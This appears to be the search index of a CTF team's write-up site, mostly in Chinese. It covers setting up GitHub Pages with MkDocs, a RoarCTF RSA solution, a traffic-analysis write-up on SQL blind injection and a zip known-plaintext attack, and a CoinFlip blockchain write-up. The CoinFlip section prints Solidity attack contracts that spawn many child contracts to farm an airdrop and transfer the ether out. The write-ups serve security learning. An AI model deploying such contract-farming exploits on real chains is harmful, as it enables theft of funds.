{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"f61d Welcome to f61d team. challenges For more details: https://github.com/f61d/challenges web https://f61d.github.io/web/ hitcon2019-virtual-public-network by CallMeCro @ 2019-10-20 WHUCTF-EasyPHP by Flash1998 @ 2019-10-21 RootersCTF-Babyweb by GG BON @ 2019-10-20 pwn https://f61d.github.io/pwn/ LazyHouse by F1r @ 2019-10-22 BabyQemu by F1r @ 2019-10-19 scvm by F1r @ 2019-10-22 crypto https://f61d.github.io/crypto/ roarctf_rsa by b1ind @ 2019-10-22 reverse https://f61d.github.io/reverse/ misc https://f61d.github.io/misc/ RoarCTF2019_CoinFlip by hitcxy @ 2019-10-20 Traffic_Analysis by F1r @ 2019-10-20","title":"home"},{"location":"#f61d","text":"Welcome to f61d team.","title":"f61d"},{"location":"#challenges","text":"For more details: https://github.com/f61d/challenges","title":"challenges"},{"location":"#web","text":"https://f61d.github.io/web/ hitcon2019-virtual-public-network by CallMeCro @ 2019-10-20 WHUCTF-EasyPHP by Flash1998 @ 2019-10-21 RootersCTF-Babyweb by GG BON @ 2019-10-20","title":"web"},{"location":"#pwn","text":"https://f61d.github.io/pwn/ LazyHouse by F1r @ 2019-10-22 BabyQemu by F1r @ 2019-10-19 scvm by F1r @ 2019-10-22","title":"pwn"},{"location":"#crypto","text":"https://f61d.github.io/crypto/ roarctf_rsa by b1ind @ 2019-10-22","title":"crypto"},{"location":"#reverse","text":"https://f61d.github.io/reverse/","title":"reverse"},{"location":"#misc","text":"https://f61d.github.io/misc/ RoarCTF2019_CoinFlip by hitcxy @ 2019-10-20 Traffic_Analysis by F1r @ 2019-10-20","title":"misc"},{"location":"backup/gitpage_fuck/","text":"github pages\u91c7\u5751 dev master User Pages gitpage\u5206\u4e3a\u4e24\u79cd\uff0c\u5173\u4e8e\u4e24\u79cdgitpage\u7684\u8bf4\u660e\u53ef\u4ee5\u53c2\u8003\uff1a https://help.github.com/en/articles/user-organization-and-project-pages \u7b2c\u4e00\u79cd\u53ebProject Pages sites\uff0c\u8fd9\u4e00\u79cd\u7684\u8bdd\u9700\u8981\u5728master\u5206\u652f\u4e0a\u5f00\u53d1\u4ee3\u7801\uff0c\u7136\u540esite\u4f1a\u90e8\u7f72\u5728gh-pages\u5206\u652f\u4e0a\u3002\u8fd9\u79cd\u4f7f\u7528\u7684url\u4e3a http(s):// username .github.io/ projectname \u8fd9\u79cd\u6a21\u5f0f\u3002 \u53e6\u5916\u4e00\u79cd\u53ebUser and Organization Pages sites\uff0c\u8fd9\u4e00\u79cd\u9700\u8981\u5728\u5176\u4ed6\u5730\u65b9\u5f00\u53d1\u4ee3\u7801\uff0c\u7136\u540e\u5c06site\u63a8\u9001\u5230master\u5206\u652f\u4e0a\uff0cgitpage\u4f1a\u76f4\u63a5\u6839\u636emaster\u5206\u652f\u5efa\u7ad9\u3002\u8fd9\u79cd\u4f7f\u7528\u7684url\u4e3a https:// username .github.io \u3002 mkdocs\u8fd9\u4e24\u79cd\u65b9\u5f0f\u90fd\u652f\u6301\uff0c\u4f46\u662f\u56e0\u4e3a\u7b2c\u4e00\u79cd\u65b9\u5f0f\u9700\u8981\u540e\u63a5\u4e00\u4e2aprojectname\uff0c\u6240\u4ee5\u6211\u66f4\u503e\u5411\u4e8e\u7b2c\u4e8c\u79cd\u65b9\u5f0f\u3002\u4f46\u662f\u7b2c\u4e8c\u79cd\u65b9\u5f0f\u4e0d\u80fd\u518dmaster\u5206\u652f\u4e0a\u521b\u5efa\u4ee3\u7801\uff0c\u9700\u8981\u672c\u5730\u521b\u5efa\u5b8c\u6210\u540e\u624d\u884c\uff0c\u56e0\u4e3a\u6211\u65b0\u5f00\u4e86\u4e00\u4e2adev\u5206\u652f\uff0c\u5e76\u8bbe\u5b9a\u4e3a\u9ed8\u8ba4\u5206\u652f\uff0c\u7136\u540e\u7f16\u8f91\u5b8c\u6210\u540e\u5728\u672c\u5730\u7f16\u8bd1\u5230master\u5206\u652f\u4e0a\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u4f7f\u7528\u540c\u4e00\u4e2a\u9879\u76ee\u5b8c\u6210\u8fd9\u4e2a\u7ad9\u70b9\uff08\u6309\u7167mkdocs\u5b98\u65b9\u7684\u8bf4\u6cd5\uff0c\u9700\u8981\u5f04\u4e24\u4e2a\u9879\u76ee\u624d\u884c\uff0c\u4e0d\u63a8\u8350\uff09\u3002 \u64cd\u4f5c\u8bb0\u5f55 mkdocs\u7684theme\u63a8\u8350mkdocs-material\uff0c\u5efa\u7ad9\u65b9\u6cd5\u975e\u5e38\u7b80\u5355\uff0c\u9996\u5148\u521b\u7acb\u597d\u9879\u76ee\uff0c\u8bbe\u5b9a\u597dmaster\u5206\u652f\u548cdev\u5206\u652f\uff0c\u672c\u5730pip\u5b89\u88c5mkdocs\u548ctheme\uff1a pip install mkdocs pip install mkdocs-material \u5c06dev\u5206\u652fclone\u4e0b\u6765\uff0c\u800c\u540e\u5728\u76ee\u5f55\u6267\u884c\uff1a mkdocs new myblog \u5c06myblog\u76ee\u5f55\u5185\u7684\u5185\u5bb9\u62f7\u8d1d\u51fa\u6765\uff0c\u5e76\u628amyblog\u76ee\u5f55\u5220\u9664\uff08\u7f51\u4e0a\u8bf4\u76f4\u63a5\u5728git\u7684\u76ee\u5f55\u4e0bnew\u53ef\u80fd\u4f1a\u51fa\u73b0git\u7684\u95ee\u9898\uff09\u3002 \u7136\u540e\u6839\u636emkdocs-material\u7684\u6587\u6863\u5bf9\u914d\u7f6e\u6587\u4ef6\u548c\u6587\u6863\u8fdb\u884c\u4fee\u6539\u548c\u7f16\u5199\uff1a https://squidfunk.github.io/mkdocs-material/ \u3002 \u4fee\u6539\u5b8c\u6210\u540e\uff0c\u53ef\u4ee5\u4f7f\u7528 mkdocs serve \u5728\u672c\u673a\u642d\u5efa\u67e5\u770b\u3002\u800c\u540e\u91cd\u70b9\u6765\u4e86\uff0c\u56e0\u4e3a\u6211\u4eec\u5728dev\u5206\u652f\u5f00\u53d1\uff0c\u800c\u6211\u4eec\u8981\u63a8\u9001\u5230master\u5206\u652f\uff0c\u56e0\u6b64\u9700\u8981\u5728\u90e8\u7f72\u7684\u65f6\u5019\u6267\u884c\u5982\u4e0b\u547d\u4ee4\uff1a mkdocs gh-deploy --remote-branch master \u3002 \u81f3\u6b64\u63a8\u9001\u5b8c\u6210\u3002\u53e6\u5916\u63a8\u8350gittalk\u4f5c\u4e3acomment\u8fdb\u884c\u4f7f\u7528\u3002 \u9996\u5148\u7533\u8bf7\u4e00\u4e2a\u65b0\u7684comment\u9879\u76ee\uff0c\u4e4b\u540e\u4f7f\u7528gittalk\u7684\u65f6\u5019\u7684\u6bcf\u4e00\u4e2a\u9875\u9762\u4e0a\u7684\u8bc4\u8bba\u90fd\u662f\u8fd9\u4e2a\u9879\u76ee\u4e2d\u7684\u4e00\u4e2aissue\u3002 \u7136\u540e\u5230 https://github.com/settings/applications/new \u7533\u8bf7 clientID \u548c clientSecret\u3002 \u6839\u636e\u4f60\u7684\u4fe1\u606f\u51c6\u5907\u5982\u4e0b\u4ee3\u7801\uff1a h2 id= __comments {{ lang.t( meta.comments ) }} /h2 form id= gitalk-form onsubmit= return false; div id= gitalk-container /div /form link rel= stylesheet href= https://unpkg.com/gitalk/dist/gitalk.css script src= https://unpkg.com/gitalk/dist/gitalk.min.js /script script src= https://cdnjs.loli.net/ajax/libs/blueimp-md5/2.10.0/js/md5.min.js /script script const gitalk = new Gitalk({ clientID: , // add yourself s clientSecret: , // add yourself s repo: comment , owner: , // add yourself s admin: [ ], // add yourself s id: md5(location.pathname), // Ensure uniqueness and length less than 50 distractionFreeMode: false // Facebook-like distraction free mode }) gitalk.render( gitalk-container ) /script \u5230 your_python_path\\Lib\\site-packages\\material\\partials\\integrations \u4e2d\u4f7f\u7528\u4e0a\u8ff0\u4ee3\u7801\u66ff\u6362disqus.html\u4e2d\u7684\u4ee3\u7801\u3002 \u6700\u540e\u91cd\u65b0\u8fd0\u884c mkdocs gh-deploy --remote-branch master \u5373\u53ef\u3002 \u53ef\u4ee5\u4f7f\u7528hackmd\u5bf9\u9879\u76ee\u4e2d\u7684\u6587\u6863\u8fdb\u884c\u7f16\u8f91\uff0c\u5728 https://hackmd.io \u4e2d\u6709\u4e00\u4e2a\u7248\u672c\u9009\u9879\u53ef\u4ee5\u4ecegit\u4e2d\u62c9\u53d6\u6587\u6863\u548c\u63a8\u9001\u6587\u6863\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5982\u679c\u91c7\u53d6\u4e86\u8fd9\u91cc\u4f7f\u7528\u7684page\uff0c\u90a3\u4e48\u5728\u62c9\u53d6\u3001\u4fee\u6539\u3001\u63a8\u9001md\u540e\uff0c\u9700\u8981\u5728\u672c\u5730\u540c\u6b65dev\u5206\u652f\uff0c\u7136\u540e\u518d\u6b21\u8fd0\u884c mkdocs gh-deploy --remote-branch master \u6307\u4ee4\u63a8\u9001\u5230master\u5206\u652f\uff0c\u56e0\u4e3agithub\u662f\u4e0d\u4f1a\u81ea\u52a8\u4ece\u4f60\u7684dev\u5206\u652f\u7f16\u8bd1\u5230master\u5206\u652f\u7684\uff0c\u8fd9\u4e5f\u662fmkdocs\u8f83\u4e3a\u9ebb\u70e6\u7684\u5730\u65b9\uff0c\u5982\u679c\u4f7f\u7528\u4e86minimal-mistakes\u7b49theme\u7684\u8bdd\u5c31\u4f1a\u65b9\u4fbf\u4e00\u4e9b\uff0c\u76f4\u63a5\u4fee\u6539md\u6587\u4ef6\u5373\u53ef\u3002","title":"gitpage\u91c7\u5751"},{"location":"backup/gitpage_fuck/#github-pages","text":"","title":"github pages\u91c7\u5751"},{"location":"backup/gitpage_fuck/#devmaster-user-pages","text":"gitpage\u5206\u4e3a\u4e24\u79cd\uff0c\u5173\u4e8e\u4e24\u79cdgitpage\u7684\u8bf4\u660e\u53ef\u4ee5\u53c2\u8003\uff1a https://help.github.com/en/articles/user-organization-and-project-pages \u7b2c\u4e00\u79cd\u53ebProject Pages sites\uff0c\u8fd9\u4e00\u79cd\u7684\u8bdd\u9700\u8981\u5728master\u5206\u652f\u4e0a\u5f00\u53d1\u4ee3\u7801\uff0c\u7136\u540esite\u4f1a\u90e8\u7f72\u5728gh-pages\u5206\u652f\u4e0a\u3002\u8fd9\u79cd\u4f7f\u7528\u7684url\u4e3a http(s):// username .github.io/ projectname \u8fd9\u79cd\u6a21\u5f0f\u3002 \u53e6\u5916\u4e00\u79cd\u53ebUser and Organization Pages sites\uff0c\u8fd9\u4e00\u79cd\u9700\u8981\u5728\u5176\u4ed6\u5730\u65b9\u5f00\u53d1\u4ee3\u7801\uff0c\u7136\u540e\u5c06site\u63a8\u9001\u5230master\u5206\u652f\u4e0a\uff0cgitpage\u4f1a\u76f4\u63a5\u6839\u636emaster\u5206\u652f\u5efa\u7ad9\u3002\u8fd9\u79cd\u4f7f\u7528\u7684url\u4e3a https:// username .github.io \u3002 mkdocs\u8fd9\u4e24\u79cd\u65b9\u5f0f\u90fd\u652f\u6301\uff0c\u4f46\u662f\u56e0\u4e3a\u7b2c\u4e00\u79cd\u65b9\u5f0f\u9700\u8981\u540e\u63a5\u4e00\u4e2aprojectname\uff0c\u6240\u4ee5\u6211\u66f4\u503e\u5411\u4e8e\u7b2c\u4e8c\u79cd\u65b9\u5f0f\u3002\u4f46\u662f\u7b2c\u4e8c\u79cd\u65b9\u5f0f\u4e0d\u80fd\u518dmaster\u5206\u652f\u4e0a\u521b\u5efa\u4ee3\u7801\uff0c\u9700\u8981\u672c\u5730\u521b\u5efa\u5b8c\u6210\u540e\u624d\u884c\uff0c\u56e0\u4e3a\u6211\u65b0\u5f00\u4e86\u4e00\u4e2adev\u5206\u652f\uff0c\u5e76\u8bbe\u5b9a\u4e3a\u9ed8\u8ba4\u5206\u652f\uff0c\u7136\u540e\u7f16\u8f91\u5b8c\u6210\u540e\u5728\u672c\u5730\u7f16\u8bd1\u5230master\u5206\u652f\u4e0a\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u4f7f\u7528\u540c\u4e00\u4e2a\u9879\u76ee\u5b8c\u6210\u8fd9\u4e2a\u7ad9\u70b9\uff08\u6309\u7167mkdocs\u5b98\u65b9\u7684\u8bf4\u6cd5\uff0c\u9700\u8981\u5f04\u4e24\u4e2a\u9879\u76ee\u624d\u884c\uff0c\u4e0d\u63a8\u8350\uff09\u3002","title":"dev&amp;master User Pages"},{"location":"backup/gitpage_fuck/#_1","text":"mkdocs\u7684theme\u63a8\u8350mkdocs-material\uff0c\u5efa\u7ad9\u65b9\u6cd5\u975e\u5e38\u7b80\u5355\uff0c\u9996\u5148\u521b\u7acb\u597d\u9879\u76ee\uff0c\u8bbe\u5b9a\u597dmaster\u5206\u652f\u548cdev\u5206\u652f\uff0c\u672c\u5730pip\u5b89\u88c5mkdocs\u548ctheme\uff1a pip install mkdocs pip install mkdocs-material \u5c06dev\u5206\u652fclone\u4e0b\u6765\uff0c\u800c\u540e\u5728\u76ee\u5f55\u6267\u884c\uff1a mkdocs new myblog \u5c06myblog\u76ee\u5f55\u5185\u7684\u5185\u5bb9\u62f7\u8d1d\u51fa\u6765\uff0c\u5e76\u628amyblog\u76ee\u5f55\u5220\u9664\uff08\u7f51\u4e0a\u8bf4\u76f4\u63a5\u5728git\u7684\u76ee\u5f55\u4e0bnew\u53ef\u80fd\u4f1a\u51fa\u73b0git\u7684\u95ee\u9898\uff09\u3002 \u7136\u540e\u6839\u636emkdocs-material\u7684\u6587\u6863\u5bf9\u914d\u7f6e\u6587\u4ef6\u548c\u6587\u6863\u8fdb\u884c\u4fee\u6539\u548c\u7f16\u5199\uff1a https://squidfunk.github.io/mkdocs-material/ \u3002 \u4fee\u6539\u5b8c\u6210\u540e\uff0c\u53ef\u4ee5\u4f7f\u7528 mkdocs serve \u5728\u672c\u673a\u642d\u5efa\u67e5\u770b\u3002\u800c\u540e\u91cd\u70b9\u6765\u4e86\uff0c\u56e0\u4e3a\u6211\u4eec\u5728dev\u5206\u652f\u5f00\u53d1\uff0c\u800c\u6211\u4eec\u8981\u63a8\u9001\u5230master\u5206\u652f\uff0c\u56e0\u6b64\u9700\u8981\u5728\u90e8\u7f72\u7684\u65f6\u5019\u6267\u884c\u5982\u4e0b\u547d\u4ee4\uff1a mkdocs gh-deploy --remote-branch master \u3002 \u81f3\u6b64\u63a8\u9001\u5b8c\u6210\u3002\u53e6\u5916\u63a8\u8350gittalk\u4f5c\u4e3acomment\u8fdb\u884c\u4f7f\u7528\u3002 \u9996\u5148\u7533\u8bf7\u4e00\u4e2a\u65b0\u7684comment\u9879\u76ee\uff0c\u4e4b\u540e\u4f7f\u7528gittalk\u7684\u65f6\u5019\u7684\u6bcf\u4e00\u4e2a\u9875\u9762\u4e0a\u7684\u8bc4\u8bba\u90fd\u662f\u8fd9\u4e2a\u9879\u76ee\u4e2d\u7684\u4e00\u4e2aissue\u3002 \u7136\u540e\u5230 https://github.com/settings/applications/new \u7533\u8bf7 clientID \u548c clientSecret\u3002 \u6839\u636e\u4f60\u7684\u4fe1\u606f\u51c6\u5907\u5982\u4e0b\u4ee3\u7801\uff1a h2 id= __comments {{ lang.t( meta.comments ) }} /h2 form id= gitalk-form onsubmit= return false; div id= gitalk-container /div /form link rel= stylesheet href= https://unpkg.com/gitalk/dist/gitalk.css script src= https://unpkg.com/gitalk/dist/gitalk.min.js /script script src= https://cdnjs.loli.net/ajax/libs/blueimp-md5/2.10.0/js/md5.min.js /script script const gitalk = new Gitalk({ clientID: , // add yourself s clientSecret: , // add yourself s repo: comment , owner: , // add yourself s admin: [ ], // add yourself s id: md5(location.pathname), // Ensure uniqueness and length less than 50 distractionFreeMode: false // Facebook-like distraction free mode }) gitalk.render( gitalk-container ) /script \u5230 your_python_path\\Lib\\site-packages\\material\\partials\\integrations \u4e2d\u4f7f\u7528\u4e0a\u8ff0\u4ee3\u7801\u66ff\u6362disqus.html\u4e2d\u7684\u4ee3\u7801\u3002 \u6700\u540e\u91cd\u65b0\u8fd0\u884c mkdocs gh-deploy --remote-branch master \u5373\u53ef\u3002 \u53ef\u4ee5\u4f7f\u7528hackmd\u5bf9\u9879\u76ee\u4e2d\u7684\u6587\u6863\u8fdb\u884c\u7f16\u8f91\uff0c\u5728 https://hackmd.io \u4e2d\u6709\u4e00\u4e2a\u7248\u672c\u9009\u9879\u53ef\u4ee5\u4ecegit\u4e2d\u62c9\u53d6\u6587\u6863\u548c\u63a8\u9001\u6587\u6863\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5982\u679c\u91c7\u53d6\u4e86\u8fd9\u91cc\u4f7f\u7528\u7684page\uff0c\u90a3\u4e48\u5728\u62c9\u53d6\u3001\u4fee\u6539\u3001\u63a8\u9001md\u540e\uff0c\u9700\u8981\u5728\u672c\u5730\u540c\u6b65dev\u5206\u652f\uff0c\u7136\u540e\u518d\u6b21\u8fd0\u884c mkdocs gh-deploy --remote-branch master \u6307\u4ee4\u63a8\u9001\u5230master\u5206\u652f\uff0c\u56e0\u4e3agithub\u662f\u4e0d\u4f1a\u81ea\u52a8\u4ece\u4f60\u7684dev\u5206\u652f\u7f16\u8bd1\u5230master\u5206\u652f\u7684\uff0c\u8fd9\u4e5f\u662fmkdocs\u8f83\u4e3a\u9ebb\u70e6\u7684\u5730\u65b9\uff0c\u5982\u679c\u4f7f\u7528\u4e86minimal-mistakes\u7b49theme\u7684\u8bdd\u5c31\u4f1a\u65b9\u4fbf\u4e00\u4e9b\uff0c\u76f4\u63a5\u4fee\u6539md\u6587\u4ef6\u5373\u53ef\u3002","title":"\u64cd\u4f5c\u8bb0\u5f55"},{"location":"crypto/","text":"waiting","title":"home"},{"location":"crypto/#waiting","text":"","title":"waiting"},{"location":"crypto/RSA/roarctf_rsa/","text":"Roar CTF \u9898\u76ee\uff1a\u89c1attachment \u5206\u6790\uff1a \u601d\u8def1\uff1a \u7b2c\u4e00\u6b65\uff1aA=(((y%x)**5)%(x%y))**2019+y**316+(y+1)/x A\u4e3a2015bit\u7684\u4e00\u4e2a\u5927\u6570\uff0c\u6839\u636ey^316\u53ef\u77e5y\u80af\u5b9a\u4e0d\u4f1a\u592a\u5927\uff0c(y+1 )/x\u4e00\u5b9a\u4e3a\u4e00\u4e2a\u6574\u6570\uff0c(((y%x)**5)%(x%y))**2019\u53ef\u80fd\u4e3a1\uff0c\u4e0d\u96be\u7b97\u51fa x=2\uff0cy=83 \u7b2c\u4e8c\u6b65\uff1ap=next_prime(166*z)=166*z+a,q=next_prime(z)=z+b\u3002a,b\u7684\u503c\u5e94\u8be5\u4e0d\u4f1a\u592a\u5927\uff0c\u6545n=p*q=166z^2+(166b+a)z+a*b\uff0c \u56e0\u800c166z^2+(166b+a)z+(a*b-n)=0\u6709\u6574\u6570\u89e3 (166b+a)^2+4*166(n-a*b)\u56e0\u6b64\u662f\u4e00\u4e2a\u5e73\u65b9\u6570\uff0c\u7a77\u4e3e\u904d\u5386a\uff0cb\u503c\u5373\u53ef\uff0c\u6700\u540e\u53ef\u77e5p=842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458569 q=139916095583110895133596833227506693679306709873174024876891023355860781981175916446323044732913066880786918629089023499311703408489151181886568535621008644997971982182426706592551291084007983387911006261442519635405457077292515085160744169867410973960652081452455371451222265819051559818441257438021073941183 \u7531\u4e8e\u4e0d\u77e5\u9053e\u503c\uff0c\u731c\u6d4be=65537\u6210\u529f\u6c42\u89e3 \u601d\u8def\u4e8c\uff1a \u5df2\u77e5\u4e86x=2\uff0cy=83\u540e\uff0c\u7531\u4e8en=p*q=166z^2+(166b+a)z+a*b\uff0cz=sqrt(n/166)\uff0c\u53ef\u4ee5\u731c\u6d4b\u51faz\u7684\u9ad8\u6bd4\u7279\u4f4d\u7684\u503c\uff0c\u501f\u6b64\u9884\u6d4b\u51fap\uff0cq\u7684\u90e8\u5206\u6bd4\u7279\u4f4d\u503c\u540e\u7528coppersmith\u5b9a\u7406\u6062\u590d\u51fap\uff0cq\u7684\u503c\uff0c\u4f46\u662f\u8fd9\u9053\u9898\u53d1\u73b0\u76f4\u63a5\u8c03\u7528sympy.nextprime(z)\u5c31\u53ef\u4ee5\u76f4\u63a5\u5f97\u5230\u4e86p\uff0cq\u7684\u503c\u3002 flag\u503c RoarCTF{wm-l1l1ll1l1l1l111ll}","title":"roarctf_rsa"},{"location":"crypto/RSA/roarctf_rsa/#roar-ctf","text":"","title":"Roar CTF"},{"location":"crypto/RSA/roarctf_rsa/#attachment","text":"","title":"\u9898\u76ee\uff1a\u89c1attachment"},{"location":"crypto/RSA/roarctf_rsa/#_2","text":"\u601d\u8def1\uff1a \u7b2c\u4e00\u6b65\uff1aA=(((y%x)**5)%(x%y))**2019+y**316+(y+1)/x","title":"\u5206\u6790\uff1a"},{"location":"crypto/RSA/roarctf_rsa/#flag","text":"RoarCTF{wm-l1l1ll1l1l1l111ll}","title":"flag\u503c"},{"location":"misc/","text":"waiting","title":"home"},{"location":"misc/#waiting","text":"","title":"waiting"},{"location":"misc/blockchain/RoarCTF2019_CoinFlip/","text":"RoarCTF2019 CoinFlip RoarCTF2019 \u7684 CoinFlip \u9898\u76ee \u9898\u76ee\uff1a\u89c1 attachment \u76ee\u5f55 Analysis Deposit() \u53ef\u4ee5\u589e\u52a0 balance[msg.sender] \uff0c\u4f46\u662f\u9700\u8981\u53d1\u9001 msg.value 500 ether \u624d\u80fd\u6ee1\u8db3\u8981\u6c42\uff0c\u4e0d\u73b0\u5b9e \u8585\u7f8a\u6bdb\u653b\u51fb : \u90e8\u7f72\u7b2c\u4e09\u65b9\u81ea\u5408\u7ea6\uff0c\u7136\u540e\u8c03\u7528 Ap() \u548c Transfer() \u5c06\u94b1\u8f6c\u5230\u56fa\u5b9a\u5730\u5740 \u56fa\u5b9a\u5730\u5740\u8c03\u7528 CaptureTheFlag \u5373\u53ef contract hack { address instance_address = 0xF60ADeF7812214eBC746309ccb590A5dBd70fc21 ; P_Bank target = P_Bank ( instance_address ); function hack1 ( string b64email ) public { target . CaptureTheFlag ( b64email ); } } contract father { function createsons () { for ( uint i = 0 ; i 101 ; i ++ ) { son ason = new son (); } } } contract son { constructor () public { P_Bank tmp = P_Bank ( 0xF60ADeF7812214eBC746309ccb590A5dBd70fc21 ); tmp . Ap (); tmp . Transfer ( 0x7ec9f720a8d59bc202490c690139f8c7cbad568d , 1 ether ); } }","title":"RoarCTF2019_CoinFlip"},{"location":"misc/blockchain/RoarCTF2019_CoinFlip/#roarctf2019-coinflip","text":"RoarCTF2019 \u7684 CoinFlip \u9898\u76ee \u9898\u76ee\uff1a\u89c1 attachment \u76ee\u5f55","title":"RoarCTF2019 CoinFlip"},{"location":"misc/blockchain/RoarCTF2019_CoinFlip/#analysis","text":"Deposit() \u53ef\u4ee5\u589e\u52a0 balance[msg.sender] \uff0c\u4f46\u662f\u9700\u8981\u53d1\u9001 msg.value 500 ether \u624d\u80fd\u6ee1\u8db3\u8981\u6c42\uff0c\u4e0d\u73b0\u5b9e \u8585\u7f8a\u6bdb\u653b\u51fb : \u90e8\u7f72\u7b2c\u4e09\u65b9\u81ea\u5408\u7ea6\uff0c\u7136\u540e\u8c03\u7528 Ap() \u548c Transfer() \u5c06\u94b1\u8f6c\u5230\u56fa\u5b9a\u5730\u5740 \u56fa\u5b9a\u5730\u5740\u8c03\u7528 CaptureTheFlag \u5373\u53ef contract hack { address instance_address = 0xF60ADeF7812214eBC746309ccb590A5dBd70fc21 ; P_Bank target = P_Bank ( instance_address ); function hack1 ( string b64email ) public { target . CaptureTheFlag ( b64email ); } } contract father { function createsons () { for ( uint i = 0 ; i 101 ; i ++ ) { son ason = new son (); } } } contract son { constructor () public { P_Bank tmp = P_Bank ( 0xF60ADeF7812214eBC746309ccb590A5dBd70fc21 ); tmp . Ap (); tmp . Transfer ( 0x7ec9f720a8d59bc202490c690139f8c7cbad568d , 1 ether ); } }","title":"Analysis"},{"location":"misc/forensic/Traffic_Analysis/","text":"360CTF \u6d41\u91cf\u5206\u6790\u9898WriteUp \u7b2c\u4e00\u6b65\u3001\u5206\u6790\u6d41\u91cf \u6211\u4eec\u7528WireShark\u6253\u5f00\u6d41\u91cf\u5305\uff0c\u7ed3\u5408\u9898\u76ee\u63cf\u8ff0\uff0c\u53d1\u73b0\u662f\u653b\u51fb\u8005\u8fdb\u884cSQL\u5e03\u5c14\u76f2\u6ce8\u7684\u4e00\u7cfb\u5217\u6d41\u91cf\u3002 \u6211\u4eec\u63d0\u53d6\u5176HTTP\u7684\u6570\u636e\u5305\uff0c\u53ef\u4ee5\u6e05\u6670\u5730\u770b\u5230\u653b\u51fb\u8005\u76f2\u6ce8\u8fc7\u7a0b\uff0c\u5176\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230ctf.flag\u5e93\u4e2d\u5b58\u5728\u4e24\u4e2a\u5b57\u6bb5\uff0c\u5206\u522b\u662furl\u4e0epasswd\u3002 \u7136\u540e\u901a\u8fc7\u653b\u51fb\u8005\u76f2\u6ce8\u7684\u6d41\u91cf\uff0c\u518d\u6839\u636e\u56de\u663e\u7684\u7ed3\u679c\uff0c\u53ef\u4ee5\u5f97\u5230URL\u5b57\u6bb5\u7684\u503c\u4e3a\uff1a t.cn/Ai8PhqSb passwd\u5b57\u6bb5\u503c\u4e3a\uff1a bkis \u6211\u4eec\u8bbf\u95ee\u8fd9\u4e2a\u7f51\u9875\uff0c\u7136\u540e\u662f\u4e00\u4e2a\u4e0b\u8f7d\u94fe\u63a5\uff0c\u8f93\u5165\u5bc6\u7801\u540e\u5373\u53ef\u4e0b\u8f7d\u5230 flag.zip \u6211\u4eec\u6253\u5f00\u8fd9\u4e2a\u6587\u4ef6\u4f1a\u770b\u5230\u6587\u4ef6\u91cc\u9762\u6709flag.txt\u548cReadme.txt\uff0c\u4f46\u662f\u6709\u5bc6\u7801\uff0c\u5e94\u8be5\u4e0d\u662f\u8ba9\u6211\u4eec\u7206\u7834\u3002\u6b63\u5e38\u6765\u8bf4\u53ea\u9700\u8981flag.txt\u5373\u53ef\uff0cReadme.txt\u663e\u5f97\u6709\u4e9b\u591a\u4f59\uff0c\u4e8e\u662f\u60f3\u5230zip\u660e\u6587\u653b\u51fb\u3002 \u91cd\u65b0\u56de\u5230\u653b\u51fb\u6d41\u91cf\u4e2d\uff0c\u53d1\u73b0\u653b\u51fb\u8005\u5728\u6ce8\u5165\u4e4b\u540e\u8fd8\u6709\u591a\u4f59\u7684\u64cd\u4f5c\uff0c\u4e3b\u8981\u662f\u8bfb\u53d6\u6587\u4ef6\u5939\u548c\u8bfb\u53d6\u6587\u4ef6\u7684\u64cd\u4f5c\uff0c\u5176\u4e2d\u6709\u4e00\u6b65\u8bfb\u53d6\u4e86Readme.7z\u7684\u5185\u5bb9\uff0c\u6211\u4eec\u5c06\u8fd4\u56de\u7684\u5b57\u8282\u6d41\u5bfc\u51fa\u5230Readme.7z\u6587\u4ef6\u4e2d\u3002 \u63a5\u7740\u53ef\u4ee5\u770b\u5230\u91cc\u9762\u6709\u4e00\u4e2aReadme.txt\uff0c\u4e8e\u662f\u5c31\u53ef\u4ee5\u5bf9\u5176\u5229\u7528zip\u660e\u6587\u653b\u51fb\uff0c\u5f97\u5230\u5bc6\u7801**CtF36o!s0** \u7528\u6539\u5bc6\u7801\u89e3\u5f00flag.zip\u5373\u53ef\u5f97\u5230flag flag{1d0ea6a36f6aaf7fa5d4b007454227d6}","title":"Traffic_Analysis"},{"location":"misc/forensic/Traffic_Analysis/#360ctf-writeup","text":"\u7b2c\u4e00\u6b65\u3001\u5206\u6790\u6d41\u91cf \u6211\u4eec\u7528WireShark\u6253\u5f00\u6d41\u91cf\u5305\uff0c\u7ed3\u5408\u9898\u76ee\u63cf\u8ff0\uff0c\u53d1\u73b0\u662f\u653b\u51fb\u8005\u8fdb\u884cSQL\u5e03\u5c14\u76f2\u6ce8\u7684\u4e00\u7cfb\u5217\u6d41\u91cf\u3002 \u6211\u4eec\u63d0\u53d6\u5176HTTP\u7684\u6570\u636e\u5305\uff0c\u53ef\u4ee5\u6e05\u6670\u5730\u770b\u5230\u653b\u51fb\u8005\u76f2\u6ce8\u8fc7\u7a0b\uff0c\u5176\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230ctf.flag\u5e93\u4e2d\u5b58\u5728\u4e24\u4e2a\u5b57\u6bb5\uff0c\u5206\u522b\u662furl\u4e0epasswd\u3002 \u7136\u540e\u901a\u8fc7\u653b\u51fb\u8005\u76f2\u6ce8\u7684\u6d41\u91cf\uff0c\u518d\u6839\u636e\u56de\u663e\u7684\u7ed3\u679c\uff0c\u53ef\u4ee5\u5f97\u5230URL\u5b57\u6bb5\u7684\u503c\u4e3a\uff1a t.cn/Ai8PhqSb passwd\u5b57\u6bb5\u503c\u4e3a\uff1a bkis \u6211\u4eec\u8bbf\u95ee\u8fd9\u4e2a\u7f51\u9875\uff0c\u7136\u540e\u662f\u4e00\u4e2a\u4e0b\u8f7d\u94fe\u63a5\uff0c\u8f93\u5165\u5bc6\u7801\u540e\u5373\u53ef\u4e0b\u8f7d\u5230 flag.zip 